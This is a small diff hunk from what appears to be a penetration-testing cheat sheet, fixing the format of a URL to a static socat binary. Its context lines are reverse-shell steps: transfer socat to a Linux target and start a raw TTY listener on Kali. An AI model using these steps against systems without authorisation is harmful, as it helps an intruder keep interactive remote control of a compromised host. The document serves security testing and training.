@@ -131,7 +131,7 @@ Restricted to Linux target
 ➤ Prerequisite: Obtain Socat on the linux target.
 
 ➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
-<https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true/>
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
 
 ➤ Step 02: On the Kali
 socat TCP-L:<port> FILE:`tty`,raw,echo=0
